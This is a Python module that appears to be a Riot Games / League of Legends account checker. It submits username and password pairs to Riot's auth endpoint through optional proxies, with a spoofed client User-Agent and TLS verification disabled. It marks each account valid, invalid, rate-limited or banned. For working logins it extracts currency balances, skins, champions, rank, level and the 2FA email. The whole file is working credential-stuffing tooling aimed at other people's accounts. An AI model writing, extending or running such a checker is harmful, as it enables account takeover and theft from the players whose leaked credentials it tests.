"""Riot Games authentication and data fetching."""

from __future__ import annotations

import json
import re
from urllib.parse import parse_qs, urlparse

import httpx

from config import AUTH_URL, ENTITLEMENTS_URL, PLATFORM_MAP, USERINFO_URL
from models import AccountResult


_HEADERS = {
    "User-Agent": (
        "RiotClient/68.0.0.4948053.4789131 rso-auth (Windows;10;;Professional, x64)"
    ),
    "Accept": "application/json",
    "Content-Type": "application/json",
}


def _build_client(proxy: str | None, timeout: int) -> httpx.Client:
    return httpx.Client(
        headers=_HEADERS,
        timeout=timeout,
        follow_redirects=False,
        proxy=proxy,
        verify=False,
    )


def check_account(
    username: str,
    password: str,
    proxy: str | None = None,
    timeout: int = 15,
) -> AccountResult:
    """Authenticate and fetch all account data."""
    result = AccountResult(username=username, password=password)
    client = _build_client(proxy, timeout)

    try:
        # Step 1: Initialize auth session (get cookies)
        init_body = {
            "client_id": "riot-client",
            "nonce": "1",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "account openid",
        }
        client.post(AUTH_URL, json=init_body)

        # Step 2: Submit credentials
        auth_body = {
            "type": "auth",
            "username": username,
            "password": password,
            "remember": True,
            "language": "en_US",
        }
        resp = client.put(AUTH_URL, json=auth_body)
        data = resp.json()

        if data.get("type") == "response":
            uri = data["response"]["parameters"]["uri"]
            token = _extract_token(uri)
            if not token:
                result.status = "ERROR"
                result.error_message = "Token extraction failed"
                return result

            result.status = "VALID"
            _fetch_account_data(client, token, result)

        elif data.get("type") == "multifactor":
            result.status = "VALID"
            result.error_message = "2FA enabled - limited data"
            _try_basic_info(client, data, result)

        elif data.get("type") == "auth" and "error" in data:
            error = data["error"]
            if error == "auth_failure":
                result.status = "INVALID"
            elif error == "rate_limited":
                result.status = "RATE_LIMITED"
                result.error_message = "Rate limited"
            else:
                result.status = "ERROR"
                result.error_message = error
        else:
            result.status = "ERROR"
            result.error_message = f"Unexpected response type: {data.get('type')}"

    except httpx.TimeoutException:
        result.status = "ERROR"
        result.error_message = "Timeout"
    except httpx.ProxyError:
        result.status = "ERROR"
        result.error_message = "Proxy error"
    except Exception as e:
        result.status = "ERROR"
        result.error_message = str(e)[:100]
    finally:
        client.close()

    return result


def _extract_token(uri: str) -> str | None:
    """Extract access token from redirect URI fragment."""
    try:
        fragment = urlparse(uri).fragment
        params = parse_qs(fragment)
        tokens = params.get("access_token")
        return tokens[0] if tokens else None
    except Exception:
        return None


def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult):
    """Fetch detailed account information using the access token."""
    auth_header = {"Authorization": f"Bearer {token}"}

    # Get user info (region, summoner name, etc.)
    try:
        resp = client.get(USERINFO_URL, headers=auth_header)
        info = resp.json()

        result.region = info.get("lol_account", {}).get("summoner_region", "").upper()
        if not result.region:
            result.region = info.get("region", {}).get("tag", "UNKNOWN").upper()

        result.summoner_name = info.get("lol_account", {}).get("summoner_name", "")
        result.email_verified = info.get("email_verified", False)

        acct = info.get("ban", {})
        if acct:
            restrictions = acct.get("restrictions", [])
            for r in restrictions:
                if r.get("type") == "PERMANENT_BAN":
                    result.status = "BANNED"
                    result.ban_status = "PERMANENT"
                    break
                elif r.get("type") == "TIME_BAN":
                    result.ban_status = "TEMPORARY"
    except Exception:
        pass

    # Get entitlement token
    entitlement_token = None
    try:
        resp = client.post(ENTITLEMENTS_URL, headers=auth_header, json={})
        entitlement_token = resp.json().get("entitlements_token")
    except Exception:
        pass

    platform = PLATFORM_MAP.get(result.region, "")

    # Get store/inventory data (RP, BE, skins, champions)
    if platform and entitlement_token:
        store_headers = {
            **auth_header,
            "X-Riot-Entitlements-JWT": entitlement_token,
        }
        _fetch_store_data(client, platform, store_headers, result)
        _fetch_ranked_data(client, platform, store_headers, result)


def _fetch_store_data(
    client: httpx.Client,
    platform: str,
    headers: dict,
    result: AccountResult,
):
    """Fetch store data: RP, BE, skins, champions."""
    region_lower = platform.lower()

    # Ledge (League Edge) endpoints for modern client
    ledge_base = f"https://{region_lower}.ledge.leagueoflegends.com"

    # Try to get wallet (RP + BE)
    try:
        resp = client.get(
            f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/wallet",
            headers=headers,
        )
        if resp.status_code == 200:
            wallet = resp.json()
            result.rp = wallet.get("rp", 0)
            result.blue_essence = wallet.get("ip", 0)  # ip = influence points = BE
    except Exception:
        pass

    # Try to get inventory (skins + champions)
    try:
        resp = client.get(
            f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/history/purchase",
            headers=headers,
        )
        if resp.status_code == 200:
            inventory = resp.json()
            skins = []
            champs = []
            for item in inventory.get("transactions", []):
                inv_type = item.get("inventoryType", "")
                if inv_type == "CHAMPION_SKIN":
                    skins.append(str(item.get("itemId", "")))
                elif inv_type == "CHAMPION":
                    champs.append(str(item.get("itemId", "")))
            result.skins = skins
            result.skin_count = len(skins)
            result.champions = champs
            result.champion_count = len(champs)
    except Exception:
        pass

    # Alternative: inventory service
    if result.skin_count == 0:
        try:
            resp = client.get(
                f"https://{region_lower}.store.leagueoflegends.com"
                "/storefront/v3/view/misc",
                headers=headers,
            )
            if resp.status_code == 200:
                data = resp.json()
                result.rp = data.get("player", {}).get("rp", result.rp)
                result.blue_essence = data.get("player", {}).get(
                    "ip", result.blue_essence
                )
        except Exception:
            pass


def _fetch_ranked_data(
    client: httpx.Client,
    platform: str,
    headers: dict,
    result: AccountResult,
):
    """Fetch ranked information and summoner level."""
    region_lower = platform.lower()

    # Get summoner data (level)
    try:
        resp = client.get(
            f"https://{region_lower}.ledge.leagueoflegends.com"
            "/ledge/v1/notifications",
            headers=headers,
        )
        if resp.status_code == 200:
            pass  # Notifications don't have level, but validates connection
    except Exception:
        pass

    # Ranked data from ledge
    try:
        resp = client.get(
            f"https://{region_lower}.ledge.leagueoflegends.com"
            "/leagues-ledge/v2/rankedStats/puuid",
            headers=headers,
        )
        if resp.status_code == 200:
            ranked = resp.json()
            queues = ranked.get("queues", [])
            for q in queues:
                if q.get("queueType") == "RANKED_SOLO_5x5":
                    tier = q.get("tier", "UNRANKED")
                    division = q.get("rank", "")
                    lp = q.get("leaguePoints", 0)
                    result.rank = f"{tier} {division} ({lp} LP)"
                    break
    except Exception:
        pass

    # Summoner level from auth/userinfo is not always available,
    # try the summoner endpoint
    try:
        resp = client.get(
            f"https://{region_lower}.ledge.leagueoflegends.com"
            "/summoner-ledge/v1/current",
            headers=headers,
        )
        if resp.status_code == 200:
            summoner = resp.json()
            result.level = summoner.get("summonerLevel", 0)
            if not result.summoner_name:
                result.summoner_name = summoner.get("displayName", "")
    except Exception:
        pass


def _try_basic_info(client: httpx.Client, data: dict, result: AccountResult):
    """Extract whatever info we can from a 2FA-gated response."""
    email = data.get("multifactor", {}).get("email", "")
    if email:
        result.error_message = f"2FA → {email}"
